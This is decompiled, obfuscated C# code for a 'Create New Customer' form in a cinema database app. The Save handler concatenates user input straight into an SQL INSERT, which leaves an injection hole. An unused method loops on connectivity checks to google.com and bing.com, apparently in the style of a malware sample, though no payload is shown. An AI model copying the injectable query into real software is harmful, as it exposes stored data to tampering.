using System;
using System.ComponentModel;
using System.Data.OleDb;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Ay2i;
using Microsoft.VisualBasic.CompilerServices;

namespace w5PK;

[DesignerGenerated]
public class Wf1a : Form
{
	private IContainer components;

	private PictureBox _PictureBox1;

	private Label _Label6;

	private Label _Label2;

	private Label _Label3;

	internal PictureBox S;

	internal TextBox Y;

	internal TextBox u;

	internal TextBox N;

	internal Label X;

	internal Button g;

	public Wf1a()
	{
		Rb1a();
	}

	protected override void Wi7y(bool Et28)
	{
		try
		{
			if (Et28 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Et28);
		}
	}

	private void Rb1a()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_0123: Unknown result type (might be due to invalid IL or missing references)
		//IL_012d: Expected O, but got Unknown
		//IL_01ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b7: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Wf1a));
		Gx92(new PictureBox());
		Hp3t(new PictureBox());
		g8MG(new Label());
		Mr1s(new TextBox());
		t5TX(new TextBox());
		Ad39(new TextBox());
		Fn7w(new Label());
		Jk86(new Label());
		f5FS(new Label());
		Ba17(new Button());
		((ISupportInitialize)i0P2()).BeginInit();
		((ISupportInitialize)Xw53()).BeginInit();
		((Control)this).SuspendLayout();
		((Control)i0P2()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox1.BackgroundImage"));
		((Control)i0P2()).set_Dock((DockStyle)1);
		((Control)i0P2()).set_Location(new Point(0, 0));
		((Control)i0P2()).set_Name("PictureBox1");
		((Control)i0P2()).set_Size(new Size(284, 50));
		i0P2().set_TabIndex(0);
		i0P2().set_TabStop(false);
		((Control)Xw53()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox2.BackgroundImage"));
		((Control)Xw53()).set_Dock((DockStyle)2);
		((Control)Xw53()).set_Location(new Point(0, 204));
		((Control)Xw53()).set_Name("PictureBox2");
		((Control)Xw53()).set_Size(new Size(284, 57));
		Xw53().set_TabIndex(1);
		Xw53().set_TabStop(false);
		o2PJ().set_AutoSize(true);
		((Control)o2PJ()).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)o2PJ()).set_ForeColor(SystemColors.ControlLight);
		((Control)o2PJ()).set_Location(new Point(44, 15));
		((Control)o2PJ()).set_Name("Label6");
		((Control)o2PJ()).set_Size(new Size(214, 24));
		((Control)o2PJ()).set_TabIndex(21);
		o2PJ().set_Text("Create New Customer");
		((Control)Xz15()).set_Location(new Point(140, 85));
		((Control)Xz15()).set_Name("txtCustomerID");
		((Control)Xz15()).set_Size(new Size(100, 20));
		((Control)Xz15()).set_TabIndex(22);
		((Control)n5TL()).set_Location(new Point(140, 120));
		((Control)n5TL()).set_Name("txtFirstName");
		((Control)n5TL()).set_Size(new Size(100, 20));
		((Control)n5TL()).set_TabIndex(23);
		((Control)Qi0y()).set_Location(new Point(140, 155));
		((Control)Qi0y()).set_Name("txtLastName");
		((Control)Qi0y()).set_Size(new Size(100, 20));
		((Control)Qi0y()).set_TabIndex(24);
		i9SP().set_AutoSize(true);
		((Control)i9SP()).set_BackColor(Color.Transparent);
		((Control)i9SP()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)i9SP()).set_Location(new Point(28, 85));
		((Control)i9SP()).set_Name("Label1");
		((Control)i9SP()).set_Size(new Size(68, 13));
		((Control)i9SP()).set_TabIndex(25);
		i9SP().set_Text("Customer ID:");
		m0Y9().set_AutoSize(true);
		((Control)m0Y9()).set_BackColor(Color.Transparent);
		((Control)m0Y9()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)m0Y9()).set_Location(new Point(28, 123));
		((Control)m0Y9()).set_Name("Label2");
		((Control)m0Y9()).set_Size(new Size(57, 13));
		((Control)m0Y9()).set_TabIndex(26);
		m0Y9().set_Text("First Name");
		a4Y0().set_AutoSize(true);
		((Control)a4Y0()).set_BackColor(Color.Transparent);
		((Control)a4Y0()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)a4Y0()).set_Location(new Point(28, 159));
		((Control)a4Y0()).set_Name("Label3");
		((Control)a4Y0()).set_Size(new Size(56, 13));
		((Control)a4Y0()).set_TabIndex(27);
		a4Y0().set_Text("Last name");
		((ButtonBase)g9AX()).get_FlatAppearance().set_BorderColor(Color.Black);
		((ButtonBase)g9AX()).set_FlatStyle((FlatStyle)0);
		((Control)g9AX()).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)g9AX()).set_Location(new Point(96, 216));
		((Control)g9AX()).set_Name("btnSave");
		((Control)g9AX()).set_Size(new Size(84, 23));
		((Control)g9AX()).set_TabIndex(40);
		((ButtonBase)g9AX()).set_Text("Save ");
		((ButtonBase)g9AX()).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 261));
		((Control)this).get_Controls().Add((Control)(object)g9AX());
		((Control)this).get_Controls().Add((Control)(object)a4Y0());
		((Control)this).get_Controls().Add((Control)(object)m0Y9());
		((Control)this).get_Controls().Add((Control)(object)i9SP());
		((Control)this).get_Controls().Add((Control)(object)Qi0y());
		((Control)this).get_Controls().Add((Control)(object)n5TL());
		((Control)this).get_Controls().Add((Control)(object)Xz15());
		((Control)this).get_Controls().Add((Control)(object)o2PJ());
		((Control)this).get_Controls().Add((Control)(object)Xw53());
		((Control)this).get_Controls().Add((Control)(object)i0P2());
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("AddCustomer1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("AddNewCustomer");
		((ISupportInitialize)i0P2()).EndInit();
		((ISupportInitialize)Xw53()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual PictureBox i0P2()
	{
		return _PictureBox1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Gx92(PictureBox m0C8)
	{
		_PictureBox1 = m0C8;
	}

	[SpecialName]
	internal virtual PictureBox Xw53()
	{
		return S;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Hp3t(PictureBox Fb54)
	{
		PictureBox val = (S = Fb54);
	}

	[SpecialName]
	internal virtual Label o2PJ()
	{
		return _Label6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void g8MG(Label f1G4)
	{
		_Label6 = f1G4;
	}

	[SpecialName]
	internal virtual TextBox Xz15()
	{
		return Y;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Mr1s(TextBox Hr76)
	{
		TextBox val = (Y = Hr76);
	}

	[SpecialName]
	internal virtual TextBox n5TL()
	{
		return u;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t5TX(TextBox Rp5k)
	{
		TextBox val = (u = Rp5k);
	}

	[SpecialName]
	internal virtual TextBox Qi0y()
	{
		return N;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ad39(TextBox Dd3o)
	{
		TextBox val = (N = Dd3o);
	}

	[SpecialName]
	internal virtual Label i9SP()
	{
		return X;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Fn7w(Label Xg20)
	{
		Label val = (X = Xg20);
	}

	[SpecialName]
	internal virtual Label m0Y9()
	{
		return _Label2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Jk86(Label Nf50)
	{
		_Label2 = Nf50;
	}

	[SpecialName]
	internal virtual Label a4Y0()
	{
		return _Label3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f5FS(Label m7RG)
	{
		_Label3 = m7RG;
	}

	[SpecialName]
	internal virtual Button g9AX()
	{
		return g;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ba17(Button i8FP)
	{
		EventHandler eventHandler = Di3p;
		Button val = g;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (g = i8FP);
		val = g;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	private void Di3p(object sender, EventArgs e)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		string connectionString = "Provider = Microsoft.ACE.OLEDB.12.0; Data Source = " + Application.get_StartupPath() + "\\Cinema 1.accdb";
		OleDbConnection val = new OleDbConnection();
		val.set_ConnectionString(connectionString);
		val.Open();
		OleDbCommand val2 = new OleDbCommand();
		val2.set_Connection(val);
		string commandText = "INSERT INTO tblCustomers (CustomerID, FirstName, LastName) VALUES ('" + Xz15().get_Text() + "','" + n5TL().get_Text() + "','" + Qi0y().get_Text() + "' )";
		val2.set_CommandText(commandText);
		val2.ExecuteNonQuery();
		((TextBoxBase)Xz15()).Clear();
		((TextBoxBase)n5TL()).Clear();
		((TextBoxBase)Qi0y()).Clear();
		val.Close();
	}

	internal static bool d7XA()
	{
		string[] array = new string[2] { "https://www.google.com/", "https://www.bing.com/" };
		int num = 0;
		checked
		{
			while (num != 2)
			{
				string[] array2 = array;
				foreach (string st in array2)
				{
					if (!m6Q3.Xn82(st))
					{
						if (num > 0)
						{
							num--;
						}
						Task.Delay(30000).Wait();
					}
					else
					{
						num++;
					}
				}
			}
			if (num == 2)
			{
				return true;
			}
			return false;
		}
	}
}
